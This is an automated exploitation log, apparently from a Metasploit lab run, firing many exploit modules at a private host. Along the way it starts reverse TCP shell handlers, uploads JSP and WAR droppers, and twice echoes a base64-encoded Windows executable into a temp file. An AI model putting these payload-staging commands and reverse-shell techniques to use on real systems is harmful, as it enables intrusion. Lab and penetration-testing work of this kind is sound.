[*] [2016.06.04-10:13:10] [0714] Attempting to execute: cmd /c echo TVp3AAAAAAACAAAAAAAAAAAA64gqAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAFRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0KJA4fMdK0Cc0huAFMzSEAUEUAAEwBAwAADFNXAAAAAAAAAADgAA8DCwEBAAAgAAAAIAAAAAAAAB0oAAAAEAAAADAAAAAAQAAAEAAAAAIAAAQAAAAAAAAABAAAAAAAAAAYQAAA6AEAACZVAAACAAABAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAAAAMAAAlwAAABgpAAAvAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAEcbAAAAEAAAABwAAAACAAAAAAAAAAAAAAAAAAAgAABgLmlkYXRhAACXAAAAADAAAAACAAAAHgAAAAAAAAAAAAAAAAAAQAAAwi5pYXQAAAAAGAAAAABAAAAAAgAAACAAAAAAAAAAAAAAAAAAAEAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVieWD7CzGRe/+xkXw8MZF8efGRfL7xkXz8MZF9PnGRfWmxkX2p8ZF97vGRfjxxkX5+cZF+vnGRfuVxkXi0sZF4/DGReThxkXlwcZF5vzGRef2xkXo/sZF6dbGRer6xkXr4MZF7PvGRe3hxkXulcdF3AAAAACDfdwNfQ2LRdyAdCjvlf9F3OvtjUXvUOhZGAAAiUXcx0XYAAAAAIN92A19DYtF2IB0KO+V/0XY6+3HRdgAAAAAg33YDX0Ni0XYgHQo4pX/Rdjr7Y1F4lD/ddzoIRgAAIlF2MdF1AAAAACDfdQNfQ2LRdSAdCjilf9F1Ovt/1XYiUX8aIoCAADo/xcAAP9V2CtF/GgsAQAAugAAAAD3NCSDxASD+AJ0CmoA6OgXAACDxASJ7F3DVYnlg+wsxkXz/sZF9PDGRfXnxkX2+8ZF9/DGRfj5xkX5psZF+qfGRfu7xkX88cZF/fnGRf75xkX/lcZF4dzGReLmxkXj0cZF5PDGReX3xkXm4MZF5/LGRejyxkXp8MZF6ufGRevFxkXs58ZF7fDGRe7mxkXv8MZF8PvGRfHhxkXylcdF3AAAAACDfdwNfQ2LRdyAdCjzlf9F3OvtjUXzUOgbFwAAiUXcx0XYAAAAAIN92A19DYtF2IB0KPOV/0XY6+3HRdgAAAAAg33YEn0Ni0XYgHQo4ZX/Rdjr7Y1F4VD/ddzo4xYAAIlF2MdF1AAAAACDfdQSfQ2LRdSAdCjhlf9F1Ovt/1XYhcB0CmoA6M4WAACDxASJ7F3DVYnlg+x0xkXz/sZF9PDG>>%TEMP%\TYMKp.b64
[-] [2016.06.04-10:13:10] [0714] 10.198.0.1:80 - Output:
[-] [2016.06.04-10:13:10] [0714] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Exploit failed.
[+] [2016.06.04-10:13:10] Workspace:lab5 Progress:719/775 (92%) [715/770] 10.198.0.1:80 - SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
[*] [2016.06.04-10:13:10] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:13:10] No reverse connect payloads available for exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec
[-] [2016.06.04-10:13:10] No payloads were compatible with exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec)
[-] [2016.06.04-10:13:10] [0715] Exploit failed: A payload has not been selected.
[-] [2016.06.04-10:13:10] [0699] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:BadBlue\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:13:11] Workspace:lab5 Progress:720/775 (92%) [716/770] 10.198.0.1:8080 - HP OpenView Network Node Manager Toolbar.exe CGI Buffer Overflow
[+] [2016.06.04-10:13:11] Workspace:lab5 Progress:721/775 (93%) [717/770] 10.198.0.1:80 - FreeNAS exec_raw.php Arbitrary Command Execution
[*] [2016.06.04-10:13:12] [0716] Started reverse TCP handler on 0.0.0.0:1495
[*] [2016.06.04-10:13:12] [0717] Started reverse TCP handler on 0.0.0.0:1496
[*] [2016.06.04-10:13:12] [0716] Trying target HP OpenView Network Node Manager 7.50 / Windows 2000 All...
[*] [2016.06.04-10:13:12] [0717] Sending exploit page 'PM.php'
[-] [2016.06.04-10:13:12] [0717] Exploit failed.
[+] [2016.06.04-10:13:14] Workspace:lab5 Progress:722/775 (93%) [718/770] 10.198.0.1:8080 - Oracle Weblogic Apache Connector POST Request Buffer Overflow
[*] [2016.06.04-10:13:15] [0718] Started reverse TCP handler on 0.0.0.0:1497
[+] [2016.06.04-10:13:15] Workspace:lab5 Progress:723/775 (93%) [719/770] 10.198.0.1:80 - Adobe ColdFusion 9 Administrative Login Bypass
[*] [2016.06.04-10:13:15] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:13:15] [0718] BEA mod_weblogic not supported
[*] [2016.06.04-10:13:15] [0719] Started reverse TCP handler on 0.0.0.0:1498
[*] [2016.06.04-10:13:16] [0719] Building CFML shell...
[*] [2016.06.04-10:13:16] [0719] Using URL: http://0.0.0.0:1499/s25HQ4
[*] [2016.06.04-10:13:16] [0719] Local IP: http://10.0.2.15:1499/s25HQ4
[*] [2016.06.04-10:13:16] [0719] Server started.
[*] [2016.06.04-10:13:16] [0719] Trying to upload payload via scheduled task...
[-] [2016.06.04-10:13:16] [0719] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Unable to get auth cookie
[*] [2016.06.04-10:13:16] [0719] Server stopped.
[+] [2016.06.04-10:13:17] Workspace:lab5 Progress:724/775 (93%) [720/770] 10.198.0.1:80 - Apache Struts includeParams Remote Code Execution
[*] [2016.06.04-10:13:17] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:13:17] [0720] Started reverse TCP handler on 0.0.0.0:1500
[-] [2016.06.04-10:13:17] [0720] Exploit failed: Msf::NoCompatiblePayloadError Failed to generate an executable payload due to an invalid platform or arch.
[+] [2016.06.04-10:13:17] Workspace:lab5 Progress:725/775 (93%) [721/770] 10.198.0.1:80 - NAS4Free Arbitrary Remote Code Execution
[*] [2016.06.04-10:13:17] [0721] Started reverse TCP handler on 0.0.0.0:1501
[+] [2016.06.04-10:13:18] Workspace:lab5 Progress:726/775 (93%) [722/770] 10.198.0.1:8080 - BEA Weblogic Transfer-Encoding Buffer Overflow
[-] [2016.06.04-10:13:18] [0721] Exploit aborted due to failure: unexpected-reply: Error getting auth token
[*] [2016.06.04-10:13:18] [0722] Started reverse TCP handler on 0.0.0.0:1502
[+] [2016.06.04-10:13:18] Workspace:lab5 Progress:727/775 (93%) [723/770] 10.198.0.1:80 - HP SiteScope issueSiebelCmd Remote Code Execution
[*] [2016.06.04-10:13:18] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:13:18] [0723] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:13:19] Workspace:lab5 Progress:728/775 (93%) [724/770] 10.198.0.1:80 - HP AutoPass License Server File Upload
[*] [2016.06.04-10:13:19] [0724] Started reverse TCP handler on 0.0.0.0:1504
[*] [2016.06.04-10:13:19] [0724] Uploading the JSP dropper IOsOkFUa.jsp...
[-] [2016.06.04-10:13:19] [0724] Unexpected response... upload maybe failed, trying anyway...
[+] [2016.06.04-10:13:21] Workspace:lab5 Progress:729/775 (94%) [725/770] 10.198.0.1:8080 - Free Download Manager Remote Control Server Buffer Overflow
[-] [2016.06.04-10:13:21] [0725] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?i-mx:(FDM Remote control server|Free Download Manager))", use 'set FingerprintCheck false' to disable this check.
[*] [2016.06.04-10:13:21] [0724] Attempting to launch payload in deployed WAR...
[+] [2016.06.04-10:13:21] Workspace:lab5 Progress:730/775 (94%) [726/770] 10.198.0.1:8080 - HTTPDX h_handlepeer() Function Buffer Overflow
[-] [2016.06.04-10:13:22] [0726] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:httpdx\/.* \(Win32\))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:13:22] Workspace:lab5 Progress:731/775 (94%) [727/770] 10.198.0.1:8080 - InterSystems Cache UtilConfigHome.csp Argument Buffer Overflow
[*] [2016.06.04-10:13:23] [0727] Started reverse TCP handler on 0.0.0.0:1507
[*] [2016.06.04-10:13:23] [0727] Trying target Windows 2000 SP4 English...
[!] [2016.06.04-10:13:24] [0724] This exploit may require manual cleanup of '../webapps/autopass/scripts/IOsOkFUa.jsp' on the target
[!] [2016.06.04-10:13:24] [0724] This exploit may require manual cleanup of '../webapps/UYzAERpS9bcLnonhJYmGEdlL9ZQ.war' on the target
[+] [2016.06.04-10:13:24] Workspace:lab5 Progress:732/775 (94%) [728/770] 10.198.0.1:80 - Rocket Servergraph Admin Center fileRequestor Remote Code Execution
[*] [2016.06.04-10:13:24] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:13:25] [0728] Started reverse TCP handler on 0.0.0.0:1508
[!] [2016.06.04-10:13:25] [0728] Failed to detect remote operating system, trying anyway...
[*] [2016.06.04-10:13:25] [0728] Dropping the encoded payload to filesystem...
[-] [2016.06.04-10:13:25] [0728] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Failed to write file... aborting
[+] [2016.06.04-10:13:25] Workspace:lab5 Progress:733/775 (94%) [729/770] 10.198.0.1:80 - MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability
[*] [2016.06.04-10:13:25] [0729] Started reverse TCP handler on 0.0.0.0:1509
[*] [2016.06.04-10:13:26] [0729] Can not detect Mantis version
[*] [2016.06.04-10:13:26] [0729] Checking access to MantisBT...
[+] [2016.06.04-10:13:26] Workspace:lab5 Progress:734/775 (94%) [730/770] 10.198.0.1:8080 - HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
[*] [2016.06.04-10:13:26] [0729] Logging in...
[*] [2016.06.04-10:13:27] [0729] Checking XmlImportExport plugin...
[*] [2016.06.04-10:13:27] [0730] Started reverse TCP handler on 0.0.0.0:1510
[*] [2016.06.04-10:13:27] [0730] Trying target HP OpenView Network Node Manager 7.50 / Windows 2000 All...
[-] [2016.06.04-10:13:27] [0729] Error trying to access XmlImportExport/import page...
[-] [2016.06.04-10:13:27] [0729] Exploit aborted due to failure: unknown: Exploit failed, aborting.
[+] [2016.06.04-10:13:27] Workspace:lab5 Progress:735/775 (94%) [731/770] 10.198.0.1:80 - D-Link DCS-931L File Upload
[-] [2016.06.04-10:13:27] No reverse connect payloads available for exploit/linux/http/dlink_dcs931l_upload
[-] [2016.06.04-10:13:27] No payloads were compatible with exploit/linux/http/dlink_dcs931l_upload)
[-] [2016.06.04-10:13:27] [0731] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:13:27] [0731] Writing 249 bytes to /sbin/chpasswd.sh
[!] [2016.06.04-10:13:27] [0731] Could not restore /sbin/chpasswd.sh to default
[+] [2016.06.04-10:13:29] Workspace:lab5 Progress:736/775 (94%) [732/770] 10.198.0.1:8080 - Open Flash Chart v2 Arbitrary File Upload
[*] [2016.06.04-10:13:30] [0732] Started reverse TCP handler on 0.0.0.0:1511
[*] [2016.06.04-10:13:30] [0732] Uploading 'rKAz3gZJr5B.php' (1285 bytes)...
[-] [2016.06.04-10:13:30] [0732] Exploit aborted due to failure: not-found: 10.198.0.1:8080 - No ofc_upload_image.php found
[+] [2016.06.04-10:13:30] Workspace:lab5 Progress:737/775 (95%) [733/770] 10.198.0.1:8080 - HP OpenView Network Node Manager OvWebHelp.exe CGI Buffer Overflow
[*] [2016.06.04-10:13:31] [0733] Started reverse TCP handler on 0.0.0.0:1512
[*] [2016.06.04-10:13:31] [0733] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:13:33] Workspace:lab5 Progress:738/775 (95%) [734/770] 10.198.0.1:8080 - HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow
[-] [2016.06.04-10:13:34] [0734] Exploit failed: No encoders encoded the buffer successfully.
[+] [2016.06.04-10:13:34] Workspace:lab5 Progress:739/775 (95%) [735/770] 10.198.0.1:8080 - HTTPDX tolog() Function Format String Vulnerability
[*] [2016.06.04-10:13:34] [0735] Started reverse TCP handler on 0.0.0.0:1514
[*] [2016.06.04-10:13:34] [0735] Automatically detecting the target...
[-] [2016.06.04-10:13:34] [0735] Exploit aborted due to failure: unknown: The server doesn't appear to be running a vulnerable version of HTTPDX
[+] [2016.06.04-10:13:34] Workspace:lab5 Progress:740/775 (95%) [736/770] 10.198.0.1:8080 - Sun Java System Web Server WebDAV OPTIONS Buffer Overflow
[*] [2016.06.04-10:13:35] [0736] Started reverse TCP handler on 0.0.0.0:1515
[+] [2016.06.04-10:13:37] Workspace:lab5 Progress:741/775 (95%) [737/770] 10.198.0.1:8080 - HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
[*] [2016.06.04-10:13:38] [0737] Started reverse TCP handler on 0.0.0.0:1516
[*] [2016.06.04-10:13:38] [0737] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:13:38] [0737] Sending exploit via GET request (ins=load)...
[-] [2016.06.04-10:13:38] [0737] Eek! We weren't expecting a response, but we got one
[+] [2016.06.04-10:13:45] Workspace:lab5 Progress:742/775 (95%) [738/770] 10.198.0.1:8080 - HP OpenView Network Node Manager getnnmdata.exe (MaxAge) CGI Buffer Overflow
[*] [2016.06.04-10:13:46] [0738] Started reverse TCP handler on 0.0.0.0:1517
[*] [2016.06.04-10:13:46] [0738] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:13:48] Workspace:lab5 Progress:743/775 (95%) [739/770] 10.198.0.1:8080 - HP OpenView Network Node Manager getnnmdata.exe (ICount) CGI Buffer Overflow
[*] [2016.06.04-10:13:48] [0739] Started reverse TCP handler on 0.0.0.0:1518
[*] [2016.06.04-10:13:48] [0739] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:13:51] Workspace:lab5 Progress:744/775 (96%) [740/770] 10.198.0.1:8080 - HP OpenView Network Node Manager getnnmdata.exe (Hostname) CGI Buffer Overflow
[*] [2016.06.04-10:13:51] [0740] Started reverse TCP handler on 0.0.0.0:1519
[*] [2016.06.04-10:13:51] [0740] Trying target HP OpenView Network Node Manager 7.50...
[+] [2016.06.04-10:13:54] Workspace:lab5 Progress:745/775 (96%) [741/770] 10.198.0.1:8080 - HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
[*] [2016.06.04-10:13:54] [0741] Started reverse TCP handler on 0.0.0.0:1520
[*] [2016.06.04-10:13:54] [0741] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01206...
[-] [2016.06.04-10:13:54] [0741] Eek! We weren't expecting a response, but we got one
[+] [2016.06.04-10:13:57] Workspace:lab5 Progress:746/775 (96%) [742/770] 10.198.0.1:8080 - HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
[*] [2016.06.04-10:13:57] [0742] Started reverse TCP handler on 0.0.0.0:1521
[*] [2016.06.04-10:13:57] [0742] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:13:57] [0742] Sending exploit via GET request...
[-] [2016.06.04-10:13:57] [0742] Exploit aborted due to failure: unknown: Eek, exploit likely failed. The body didn't contain what we expected.
[+] [2016.06.04-10:13:57] Workspace:lab5 Progress:747/775 (96%) [743/770] 10.198.0.1:8080 - HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
[*] [2016.06.04-10:13:58] [0743] Started reverse TCP handler on 0.0.0.0:1522
[*] [2016.06.04-10:13:58] [0743] Trying target HP OpenView Network Node Manager 7.53 w/NNM_01201...
[*] [2016.06.04-10:13:58] [0743] Sending exploit via POST request...
[-] [2016.06.04-10:13:58] [0743] Exploit aborted due to failure: unknown: Eek, exploit likely failed. The body didn't contain what we expected.
[+] [2016.06.04-10:13:58] Workspace:lab5 Progress:748/775 (96%) [744/770] 10.198.0.1:8080 - Oracle Forms and Reports Remote Code Execution
[*] [2016.06.04-10:13:58] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:13:59] [0744] Started reverse TCP handler on 0.0.0.0:1523
[*] [2016.06.04-10:13:59] [0744] Querying showenv!
[-] [2016.06.04-10:13:59] [0744] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - target is not vulnerable or unreachable
[+] [2016.06.04-10:13:59] Workspace:lab5 Progress:749/775 (96%) [745/770] 10.198.0.1:8080 - NFR Agent FSFUI Record File Upload RCE
[*] [2016.06.04-10:13:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:00] [0745] Started reverse TCP handler on 0.0.0.0:1525
[*] [2016.06.04-10:14:00] [0745] Encoding payload into VBS...
[*] [2016.06.04-10:14:01] [0745] Generating VBS file...
[*] [2016.06.04-10:14:01] [0745] Uploading the VBS file
[-] [2016.06.04-10:14:21] [0745] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv2/v3 read server hello A
[+] [2016.06.04-10:14:21] Workspace:lab5 Progress:750/775 (96%) [746/770] 10.198.0.1:8080 - HP Intelligent Management Center Arbitrary File Upload
[-] [2016.06.04-10:14:21] No reverse connect payloads available for exploit/windows/http/hp_imc_mibfileupload
[-] [2016.06.04-10:14:21] No payloads were compatible with exploit/windows/http/hp_imc_mibfileupload)
[-] [2016.06.04-10:14:21] [0746] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:14:22] Workspace:lab5 Progress:751/775 (96%) [747/770] 10.198.0.1:8080 - Nagios3 history.cgi Host Command Execution
[*] [2016.06.04-10:14:22] [0747] Started reverse TCP handler on 0.0.0.0:1526
[-] [2016.06.04-10:14:22] [0747] Please specify the correct path to history.cgi in the URI parameter
[*] [2016.06.04-10:14:22] [0747] Automatically detecting the target...
[-] [2016.06.04-10:14:22] [0747] Exploit aborted due to failure: no-target: No matching target
[+] [2016.06.04-10:14:22] Workspace:lab5 Progress:752/775 (97%) [748/770] 10.198.0.1:8080 - Adobe ColdFusion 9 Administrative Login Bypass
[*] [2016.06.04-10:14:22] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:23] [0748] Started reverse TCP handler on 0.0.0.0:1527
[*] [2016.06.04-10:14:24] [0748] Building CFML shell...
[*] [2016.06.04-10:14:24] [0748] Using URL: http://0.0.0.0:1528/nmfGrMq
[*] [2016.06.04-10:14:24] [0748] Local IP: http://10.0.2.15:1528/nmfGrMq
[*] [2016.06.04-10:14:24] [0748] Server started.
[*] [2016.06.04-10:14:24] [0748] Trying to upload payload via scheduled task...
[-] [2016.06.04-10:14:24] [0748] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - RDS component was unreachable
[*] [2016.06.04-10:14:24] [0748] Server stopped.
[+] [2016.06.04-10:14:24] Workspace:lab5 Progress:753/775 (97%) [749/770] 10.198.0.1:8080 - Novell ZENworks Configuration Management Remote Execution
[*] [2016.06.04-10:14:24] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:24] [0749] Started reverse TCP handler on 0.0.0.0:1529
[*] [2016.06.04-10:14:24] [0749] Uploading 1805 bytes as DmI1.war ...
[-] [2016.06.04-10:14:24] [0749] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:14:24] Workspace:lab5 Progress:754/775 (97%) [750/770] 10.198.0.1:8080 - Apache Struts includeParams Remote Code Execution
[*] [2016.06.04-10:14:24] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:24] [0750] Started reverse TCP handler on 0.0.0.0:1530
[-] [2016.06.04-10:14:24] [0750] Exploit failed: Msf::NoCompatiblePayloadError Failed to generate an executable payload due to an invalid platform or arch.
[+] [2016.06.04-10:14:25] Workspace:lab5 Progress:755/775 (97%) [751/770] 10.198.0.1:8080 - NAS4Free Arbitrary Remote Code Execution
[*] [2016.06.04-10:14:25] [0751] Started reverse TCP handler on 0.0.0.0:1531
[-] [2016.06.04-10:14:25] [0751] Exploit aborted due to failure: no-access: Login failed
[+] [2016.06.04-10:14:26] Workspace:lab5 Progress:756/775 (97%) [752/770] 10.198.0.1:8080 - HP SiteScope issueSiebelCmd Remote Code Execution
[*] [2016.06.04-10:14:26] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:26] [0752] Started reverse TCP handler on 0.0.0.0:1532
[*] [2016.06.04-10:14:26] [0752] Delivering payload...
[-] [2016.06.04-10:14:27] [0752] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Unexpected response, aborting...
[+] [2016.06.04-10:14:27] Workspace:lab5 Progress:757/775 (97%) [753/770] 10.198.0.1:8080 - HP AutoPass License Server File Upload
[*] [2016.06.04-10:14:28] [0753] Started reverse TCP handler on 0.0.0.0:1533
[*] [2016.06.04-10:14:28] [0753] Uploading the JSP dropper WCReQmRr.jsp...
[-] [2016.06.04-10:14:28] [0753] Unexpected response... upload maybe failed, trying anyway...
[-] [2016.06.04-10:14:28] [0753] Unexpected response after executing the dropper...
[*] [2016.06.04-10:14:30] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:33] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:35] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:37] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:40] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:42] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:44] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:47] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:49] [0753] Attempting to launch payload in deployed WAR...
[*] [2016.06.04-10:14:52] [0753] Attempting to launch payload in deployed WAR...
[!] [2016.06.04-10:14:55] [0753] This exploit may require manual cleanup of '../webapps/autopass/scripts/WCReQmRr.jsp' on the target
[!] [2016.06.04-10:14:55] [0753] This exploit may require manual cleanup of '../webapps/179iX2alVG.war' on the target
[+] [2016.06.04-10:14:55] Workspace:lab5 Progress:758/775 (97%) [754/770] 10.198.0.1:8080 - Rocket Servergraph Admin Center fileRequestor Remote Code Execution
[*] [2016.06.04-10:14:55] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:14:55] [0754] Started reverse TCP handler on 0.0.0.0:1534
[!] [2016.06.04-10:14:55] [0754] Failed to detect remote operating system, trying anyway...
[*] [2016.06.04-10:14:55] [0754] Dropping the encoded payload to filesystem...
[-] [2016.06.04-10:14:56] [0754] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Failed to write file... aborting
[+] [2016.06.04-10:14:56] Workspace:lab5 Progress:759/775 (97%) [755/770] 10.198.0.1:8080 - MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability
[*] [2016.06.04-10:14:56] [0755] Started reverse TCP handler on 0.0.0.0:1535
[*] [2016.06.04-10:14:57] [0755] Can not detect Mantis version
[*] [2016.06.04-10:14:57] [0755] Checking access to MantisBT...
[*] [2016.06.04-10:14:58] [0755] Logging in...
[-] [2016.06.04-10:14:58] [0755] Exploit aborted due to failure: no-access: Login failed
[+] [2016.06.04-10:14:59] Workspace:lab5 Progress:760/775 (98%) [756/770] 10.198.0.1:8080 - EasyFTP Server list.html path Stack Buffer Overflow
[-] [2016.06.04-10:14:59] [0756] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:Easy-Web Server\/)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:14:59] Workspace:lab5 Progress:761/775 (98%) [757/770] 10.198.0.1:8080 - Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow
[*] [2016.06.04-10:15:00] [0757] Started reverse TCP handler on 0.0.0.0:1537
[*] [2016.06.04-10:15:00] [0757] Automatically detecting the target...
[-] [2016.06.04-10:15:00] [0757] Exploit aborted due to failure: no-target: Unable to automatically detect the target version
[+] [2016.06.04-10:15:00] Workspace:lab5 Progress:762/775 (98%) [758/770] 10.198.0.1:8080 - OpenPLI Webif Arbitrary Command Execution
[-] [2016.06.04-10:15:00] No reverse connect payloads available for exploit/linux/http/dreambox_openpli_shell
[-] [2016.06.04-10:15:00] No payloads were compatible with exploit/linux/http/dreambox_openpli_shell)
[-] [2016.06.04-10:15:00] [0758] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:15:01] Workspace:lab5 Progress:763/775 (98%) [759/770] 10.198.0.1:8080 - v0pCr3w Web Shell Remote Code Execution
[-] [2016.06.04-10:15:01] No reverse connect payloads available for exploit/multi/http/v0pcr3w_exec
[-] [2016.06.04-10:15:01] No payloads were compatible with exploit/multi/http/v0pcr3w_exec)
[-] [2016.06.04-10:15:01] [0759] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:15:01] Workspace:lab5 Progress:764/775 (98%) [760/770] 10.198.0.1:8080 - STUNSHELL Web Shell Remote PHP Code Execution
[*] [2016.06.04-10:15:01] [0760] Started reverse TCP handler on 0.0.0.0:1538
[+] [2016.06.04-10:15:04] Workspace:lab5 Progress:765/775 (98%) [761/770] 10.198.0.1:8080 - STUNSHELL Web Shell Remote Code Execution
[-] [2016.06.04-10:15:04] No reverse connect payloads available for exploit/multi/http/stunshell_exec
[-] [2016.06.04-10:15:04] No payloads were compatible with exploit/multi/http/stunshell_exec)
[-] [2016.06.04-10:15:04] [0761] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:15:04] Workspace:lab5 Progress:766/775 (98%) [762/770] 10.198.0.1:8080 - D-Link DCS-931L File Upload
[-] [2016.06.04-10:15:04] No reverse connect payloads available for exploit/linux/http/dlink_dcs931l_upload
[-] [2016.06.04-10:15:04] No payloads were compatible with exploit/linux/http/dlink_dcs931l_upload)
[-] [2016.06.04-10:15:05] [0762] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:15:05] [0762] Writing 249 bytes to /sbin/chpasswd.sh
[!] [2016.06.04-10:15:05] [0762] Could not restore /sbin/chpasswd.sh to default
[+] [2016.06.04-10:15:05] Workspace:lab5 Progress:767/775 (98%) [763/770] 10.198.0.1:8080 - SAP ConfigServlet Remote Code Execution
[*] [2016.06.04-10:15:05] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:15:05] [0763] Started reverse TCP handler on 0.0.0.0:1539
[*] [2016.06.04-10:15:05] [0763] 10.198.0.1:8080 - Exploiting remote system
[*] [2016.06.04-10:15:06] [0763] Attempting to execute: cmd /c echo TVp3AAAAAAACAAAAAAAAAAAA64gqAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAFRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0KJA4fMdK0Cc0huAFMzSEAUEUAAEwBAwAADFNXAAAAAAAAAADgAA8DCwEBAAAgAAAAIAAAAAAAALIoAAAAEAAAADAAAAAAQAAAEAAAAAIAAAQAAAAAAAAABAAAAAAAAAAYQAAA6AEAAAxOAAACAAABAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAAAAMAAAlwAAAIApAAAvAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAK8bAAAAEAAAABwAAAACAAAAAAAAAAAAAAAAAAAgAABgLmlkYXRhAACXAAAAADAAAAACAAAAHgAAAAAAAAAAAAAAAAAAQAAAwi5pYXQAAAAAGAAAAABAAAAAAgAAACAAAAAAAAAAAAAAAAAAAEAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVieWD7CzGRe/ZxkXw18ZF8cDGRfLcxkXz18ZF9N7GRfWBxkX2gMZF95zGRfjWxkX53sZF+t7GRfuyxkXi9cZF49fGReTGxkXl5sZF5tvGRefRxkXo2cZF6fHGRerdxkXrx8ZF7NzGRe3GxkXussdF3AAAAACDfdwNfQ2LRdyAdCjvsv9F3OvtjUXvUOjBGAAAiUXcx0XYAAAAAIN92A19DYtF2IB0KO+y/0XY6+3HRdgAAAAAg33YDX0Ni0XYgHQo4rL/Rdjr7Y1F4lD/ddzoiRgAAIlF2MdF1AAAAACDfdQNfQ2LRdSAdCjisv9F1Ovt/1XYiUX8aIoCAADoZxgAAP9V2CtF/GgsAQAAugAAAAD3NCSDxASD+AJ0CmoA6FAYAACDxASJ7F3DVYnlg+wsxkXz2cZF9NfGRfXAxkX23MZF99fGRfjexkX5gcZF+oDGRfucxkX81sZF/d7GRf7exkX/ssZF4fvGReLBxkXj9sZF5NfGReXQxkXmx8ZF59XGRejVxkXp18ZF6sDGRevixkXswMZF7dfGRe7BxkXv18ZF8NzGRfHGxkXyssdF3AAAAACDfdwNf